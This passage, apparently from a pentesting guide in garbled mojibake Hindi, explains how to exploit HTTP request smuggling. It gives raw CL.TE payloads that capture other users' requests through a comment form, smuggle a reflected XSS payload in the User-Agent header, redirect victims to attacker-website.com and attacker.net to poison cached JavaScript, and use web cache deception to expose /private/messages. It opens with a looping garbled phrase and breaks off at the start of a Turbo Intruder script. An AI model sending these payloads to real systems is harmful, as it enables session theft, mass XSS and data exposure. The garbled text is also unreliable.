рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдирд┐рд░реНрджреЗрд╢рд┐рдд рдЬ
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ, **рдХрдореЗрдВрдЯ рдкреИрд░рд╛рдореАрдЯрд░** рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдХрд┐рд╕реА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдпреЛрдЧреНрдп рдкреГрд╖реНрда рдкрд░ рдХрдореЗрдВрдЯ рдЦрдВрдб рдореЗрдВ рд╕рд╛рдордЧреНрд░реА рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рдирд╛ рд╣реИред рдЗрд╕рдХрд╛ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рдЖрдЧрд╛рдореА рдЕрдиреБрд░реЛрдз рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдПрдХ рдХрдореЗрдВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдХрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рддрдХрдиреАрдХ рдХреА рдХреБрдЫ рд╕реАрдорд╛рдПрдБ рд╣реИрдВред рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ, рдпрд╣ рдХреЗрд╡рд▓ рдЙрд╕ рд╕реАрдорд╛ рддрдХ рдбреЗрдЯрд╛ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╕реНрдордЧрд▓реНрдб рдЕрдиреБрд░реЛрдз рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рдкреИрд░рд╛рдореАрдЯрд░ рд╡рд┐рднрд╛рдЬрдХ рддрдХ рд╣реЛрддрд╛ рд╣реИред URL-encoded рдлреЙрд░реНрдо рд╕рдмрдорд┐рд╢рди рдХреЗ рд▓рд┐рдП, рдпрд╣ рд╡рд┐рднрд╛рдЬрдХ `&` рд╡рд░реНрдг рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдкреАрдбрд╝рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЕрдиреБрд░реЛрдз рд╕реЗ рдХреИрдкреНрдЪрд░ рдХреА рдЧрдИ рд╕рд╛рдордЧреНрд░реА рдкрд╣рд▓реЗ `&` рдкрд░ рд░реБрдХреЗрдЧреА, рдЬреЛ рдХреНрд╡реЗрд░реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдпрд╣ рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рд╣реИ рдХрд┐ рдпрд╣ рджреГрд╖реНрдЯрд┐рдХреЛрдг рднреА рдПрдХ TE.CL рднрдпрд╛рдирдХрддрд╛ рдХреЗ рд╕рд╛рде рд╕рдВрднрд╡ рд╣реИред рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдорд╛рдорд▓реЛрдВ рдореЗрдВ, рдЕрдиреБрд░реЛрдз рдХреЛ `search=\r\n0` рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред рдиреНрдпреВрд▓рд╛рдЗрди рд╡рд░реНрдгреЛрдВ рдХреЗ рдмрд╛рд╡рдЬреВрдж, рдорд╛рди рдЦреЛрдЬ рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдЬреЛрдбрд╝реЗ рдЬрд╛рдПрдВрдЧреЗред

### рд░рд┐рдлреНрд▓реЗрдХреНрдЯреЗрдб XSS рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ

HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡реЗрдм рдкреГрд╖реНрдареЛрдВ рдХреЛ **рд░рд┐рдлреНрд▓реЗрдХреНрдЯреЗрдб XSS** рдХреЗ рд▓рд┐рдП рднреЗрджреНрдп рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд▓рд╛рдн рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ:

* рд▓рдХреНрд╖реНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд╕рд╛рде **рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ** рд╣реИред
* рдЕрдиреБрд░реЛрдз рдХреЗ рдЙрди рд╣рд┐рд╕реНрд╕реЛрдВ рдореЗрдВ XSS рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬреЛ **рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдЕрдиреБрдкрд▓рдмреНрдз** рд╣реЛрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ HTTP рдЕрдиреБрд░реЛрдз рд╣реЗрдбрд░ред

рдЬрд╣рд╛рдБ рдПрдХ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛-рдПрдЬреЗрдВрдЯ рд╣реЗрдбрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд░рд┐рдлреНрд▓реЗрдХреНрдЯреЗрдб XSS рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИ, рд╡рд╣рд╛рдБ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЗрд▓реЛрдб рдЗрд╕ рднреЗрджреНрдпрддрд╛ рдХрд╛ рд╢реЛрд╖рдг рдХреИрд╕реЗ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
рдпрд╣ payload рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд░рдЪрд┐рдд рд╣реИ рд╡рд┐рдХрд▓реНрдкрд┐рддрд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛:

1. рдПрдХ `POST` рдЕрдиреБрд░реЛрдз рдкреНрд░рд╛рд░рдВрдн рдХрд░рдирд╛, рдЬреЛ рд╕рд╛рдорд╛рдиреНрдп рджрд┐рдЦрддрд╛ рд╣реИ, рдПрдХ `Transfer-Encoding: chunked` рд╣реЗрдбрд░ рдХреЗ рд╕рд╛рде, рдЬреЛ smuggling рдХреА рд╢реБрд░реБрдЖрдд рджрд░реНрд╢рд╛рддрд╛ рд╣реИред
2. `0` рдХреЗ рд╕рд╛рде рдЖрдЧреЗ рдмрдврд╝рдирд╛, рдЬреЛ рдЪрдВрдХреНрдб рд╕рдВрджреЗрд╢ рд╢рд░реАрд░ рдХреЗ рдЕрдВрдд рдХреЛ рдЪрд┐рд╣реНрдирд┐рдд рдХрд░рддрд╛ рд╣реИред
3. рдлрд┐рд░, smuggling `GET` рдЕрдиреБрд░реЛрдз рдкреЗрд╢ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд╣рд╛рдВ `User-Agent` рд╣реЗрдбрд░ рдореЗрдВ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ, `<script>alert(1)</script>`, рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрдм рд╕рд░реНрд╡рд░ рдЗрд╕ рдЙрд╕рдХреЗ рдмрд╛рдж рдХреЗ рдЕрдиреБрд░реЛрдз рдХреЛ рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рдХрд░рддрд╛ рд╣реИ, рддреЛ XSS рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рддрд╛ рд╣реИред

`User-Agent` рдХреЛ smuggling рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдордирд┐рдкреБрд░рд┐рдд рдХрд░рдХреЗ, payload рд╕рд╛рдорд╛рдиреНрдп рдЕрдиреБрд░реЛрдз рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рдЫрд▓рдХрд░, рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдПрдХ рдЧреИрд░-рдорд╛рдирдХ рд▓реЗрдХрд┐рди рдкреНрд░рднрд╛рд╡реА рддрд░реАрдХреЗ рд╕реЗ Reflected XSS рд╡рдВрд░рдмрд┐рд▓рд┐рдЯреА рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред
```
GET /home HTTP/1.1
Host: normal-website.com
```
рдкрд░рд┐рдгрд╛рдо:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
рдпрд╣ рд╡реНрдпрд╡рд╣рд╛рд░ рдкреНрд░рддрд┐рдд рд▓рдЧрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди HTTP рдЕрдиреБрд░реЛрдз рдЕрдкрд░рд╛рдз рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдПрдХ рдмрд╛рд╣реНрдп рд╕рд╛рдЗрдЯ рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
рдпрд╣ рдЪреЛрд░реА рдЧрдИ рдЕрдиреБрд░реЛрдз рдЕрдЧрд▓реЗ рдкреНрд░рд╕рдВрд╕реНрдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдиреБрд░реЛрдз рдХреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
рдкрд░рд┐рдгрд╛рдо:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
### рд╡реЗрдм рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ рдХреЛ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдЪрдЯреАрдЯреАрдкреА рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рд╕реНрдордЧреНрд▓рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

### рдПрдЪрдЯреАрдЯреАрдкреА рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рд╕реНрдордЧреНрд▓рд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡реЗрдм рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ рдХрд╛ рд╢реЛрд╖рдг <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

рд╡реЗрдм рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ рдХреЛ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЕрдЧрд░ **рдлреНрд░рдВрдЯ-рдПрдВрдб рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдХрд╛ рдХреЛрдИ рднрд╛рдЧ рд╕рд╛рдордЧреНрд░реА рдХреИрд╢ рдХрд░рддрд╛ рд╣реИ**, рд╕рд╛рдорд╛рдиреНрдпрдд: рдкреНрд░рджрд░реНрд╢рди рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдПред рд╕рд░реНрд╡рд░ рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдореЛрдбрд╝рдХрд░, рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ **рдХреИрд╢ рдХреЛ рдкреЙрдЗрдЬрд╝рди** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

рдкрд╣рд▓реЗ рд╣рдордиреЗ рджреЗрдЦрд╛ рдХрд┐ рд╕рд░реНрд╡рд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рдХреИрд╕реЗ рдмрджрд▓реА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ рддрд╛рдХрд┐ 404 рддреНрд░реБрдЯрд┐ рд▓реМрдЯрд╛рдИ рдЬрд╛ рд╕рдХреЗ (рд╕рдВрджрд░реНрдн рдХреЗ рд▓рд┐рдП [рдореВрд▓ рдЙрджрд╛рд╣рд░рдг](./#basic-examples) рджреЗрдЦреЗрдВ)ред рдЙрд╕реА рддрд░рд╣, рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рд╕рд░реНрд╡рд░ рдХреЛ рдзреЛрдЦрд╛ рджреЗрдХрд░ `/static/include.js` рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдкрд░ `/index.html` рд╕рд╛рдордЧреНрд░реА рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛред рдЗрд╕ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, `/static/include.js` рд╕рд╛рдордЧреНрд░реА рдХреИрд╢ рдореЗрдВ `/index.html` рдХреА рд╕рд╛рде рдмрджрд▓ рдЬрд╛рддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ `/static/include.js` рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЕрдЧрдВрддреБрдХ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдПрдХ рдбреАрдирд╛рдпрд▓ рдСрдл рд╕рд░реНрд╡рд┐рд╕ (DoS) рдХреА рдУрд░ рд▓реЗ рдЬрд╛рддрд╛ рд╣реИред

рдпрд╣ рддрдХрдиреАрдХ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдкреНрд░рднрд╛рд╡реА рд╣реЛ рдЬрд╛рддреА рд╣реИ рдЕрдЧрд░ **рдУрдкрди рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рджреЛрд╖** рдкрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдпрд╛ рдпрджрд┐ **рдУрди-рд╕рд╛рдЗрдЯ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХреЛ рдУрдкрди рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдРрд╕реА рдХрдорд┐рдпреЛрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ `/static/include.js` рдХреА рдХреИрд╢ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд╕рд╛рде рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡реНрдпрд╛рдкрдХ рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ (XSS) рд╣рдорд▓рд╛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдкрдбреЗрдЯ рдХрд┐рдП рдЧрдП `/static/include.js` рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕рднреА рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЗ рдЦрд┐рд▓рд╛рдлред

рдиреАрдЪреЗ **рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд╕рд╛рде рдУрди-рд╕рд╛рдЗрдЯ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХреЛ рдУрдкрди рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХрд╛ рдЙрджрд╛рд╣рд░рдг рд╣реИред рдЙрджреНрджреЗрд╢реНрдп рд╣реИ рдХрд┐ `/static/include.js` рдХреА рдХреИрд╢ рд╕рд╛рдордЧреНрд░реА рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рд╕реЗрд╡ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛рдП:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Embedded request `/post/next?postId=3` рдХреЛ рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦреЗрдВред рдпрд╣ рдЕрдиреБрд░реЛрдз `/post?postId=4` рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рд╣реЛрдЧрд╛, **Host header value** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЛрдореЗрди рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред **Host header** рдХреЛ рдмрджрд▓рдХрд░, рд╣рдорд▓рд╛рд╡рд╛рд░ рд╡реНрдпрдХреНрддрд┐ рдЕрдкрдиреЗ рдбреЛрдореЗрди рдкрд░ рдЕрдиреБрд░реЛрдз рдХреЛ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ (**on-site redirect to open redirect**ред)

рд╕рдлрд▓ **socket poisoning** рдХреЗ рдмрд╛рдж, `/static/include.js` рдХреЗ рд▓рд┐рдП рдПрдХ **GET request** рдкреНрд░рд╛рд░рдВрдн рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрд╣ рдЕрдиреБрд░реЛрдз рдкреВрд░реНрд╡ **on-site redirect to open redirect** рдЕрдиреБрд░реЛрдз рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджреВрд╖рд┐рдд рд╣реЛрдЧрд╛ рдФрд░ рд╣рдорд▓рд╛рд╡рд╛рд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреА рд╕рд╛рдордЧреНрд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧрд╛ред

рдЗрд╕рдХреЗ рдмрд╛рдж, `/static/include.js` рдХреЗ рд▓рд┐рдП рдХреЛрдИ рднреА рдЕрдиреБрд░реЛрдз рд╣рдорд▓рд╛рд╡рд╛рд░ рдХреЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреА рдХреИрд╢ рдХреА рд╕рд╛рдордЧреНрд░реА рд╕реЗрд╡рд╛ рдХрд░реЗрдЧрд╛, рдЬрд┐рд╕рд╕реЗ рд╡реНрдпрд╛рдкрдХ XSS рд╣рдорд▓рд╛ рд╢реБрд░реВ рд╣реЛ рдЬрд╛рдПрдЧрд╛ред

### рд╡реЗрдм рдХреИрд╢ рдзреЛрдЦрд╛рдзрдбрд╝реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП HTTP рдЕрдиреБрд░реЛрдз рдЕрдкрд░рд╛рдз рдХрд╛ рдЙрдкрдпреЛрдЧ <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **рд╡реЗрдм рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ рдФрд░ рд╡реЗрдм рдХреИрд╢ рдзреЛрдЦрд╛рдзрдбрд╝рд╝реА рдХреЗ рдмреАрдЪ рдЕрдВрддрд░ рдХреНрдпрд╛ рд╣реИ?**
>
> * **рд╡реЗрдм рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ** рдореЗрдВ, рд╣рдорд▓рд╛рд╡рд╛рд░ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЛ рдХреИрд╢ рдореЗрдВ рдХреБрдЫ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рд╕рд╛рдордЧреНрд░реА рд╕реНрдЯреЛрд░ рдХрд░рдиреЗ рдХреЗ рдХрд╛рд░рдг, рдФрд░ рдпрд╣ рд╕рд╛рдордЧреНрд░реА рдХреИрд╢ рд╕реЗ рдЕрдиреНрдп рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕реЗрд╡рд┐рдд рдХреА рдЬрд╛рддреА рд╣реИред
> * **рд╡реЗрдм рдХреИрд╢ рдзреЛрдЦрд╛рдзрдбрд╝рд╝реА** рдореЗрдВ, рд╣рдорд▓рд╛рд╡рд╛рд░ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЛ рдХреИрд╢ рдореЗрдВ рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдХреБрдЫ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕рд╛рдордЧреНрд░реА рд╕реНрдЯреЛрд░ рдХрд░рдиреЗ рдХреЗ рдХрд╛рд░рдг, рдФрд░ рдлрд┐рд░ рд╣рдорд▓рд╛рд╡рд╛рд░ рдЗрд╕ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдХреИрд╢ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИред

рд╣рдорд▓рд╛рд╡рд╛рд░ рдПрдХ рдЕрдкрд░рд╛рдзреАрдд рдЕрдиреБрд░реЛрдз рддреИрдпрд╛рд░ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛-рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕рд╛рдордЧреНрд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдХрд╛ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВ:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
рдпрджрд┐ рдпрд╣ рдЪреЛрд░реА рдЧрдИ рдЕрдиреБрд░реЛрдз рдХреИрд╢ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреЛ рдЬрд╛рд╣рд┐рд░ рд╕рд╛рдордЧреНрд░реА рдХреЗ рд▓рд┐рдП рд╣реИ (рдЬреИрд╕реЗ, `/someimage.png`), рддреЛ рдкреАрдбрд╝рд┐рдд рдХреЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ `/private/messages` рд╕реНрдерд╛рдпреА рд╕рд╛рдордЧреНрд░реА рдХреА рдХреИрд╢ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреЗ рддрд╣рдд рдХреИрд╢ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рд╣рдорд▓рд╛рд╡рд░ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЗрди рдХреИрд╢ рдХрд┐рдП рдЧрдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдХреЛ рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдЕрд╕рдордВрдЬрд╕реНрдпрддрд╛ рдХреЗ рд╕рд╛рде HTTP рдЕрдиреБрд░реЛрдз рддрд╕реНрдХрд░реАрдХрд░рдг

рдХреНрдпрд╛ рдЖрдкрдиреЗ рдХреБрдЫ HTTP рдЕрдиреБрд░реЛрдз рддрд╕реНрдХрд░реАрдХрд░рдг рдХреА рдХрдордЬреЛрд░реА рдкрд╛рдИ рд╣реИ рдФрд░ рдЖрдк рдЗрд╕реЗ рдХреИрд╕реЗ рд╢реЛрд╖рдг рдХрд░реЗрдВ рдЗрд╕рдХрд╛ рдкрддрд╛ рдирд╣реАрдВ рд╣реИред рдЗрд╕рдХреЗ рдЕрдиреНрдп рд╢реЛрд╖рдг рдХреЗ рддрд░реАрдХреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## рдЯрд░реНрдмреЛ рдЗрдВрдЯреНрд░реВрдбрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯ

### рд╕реАрдПрд▓.рдЯреА

рд╕реЗ [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

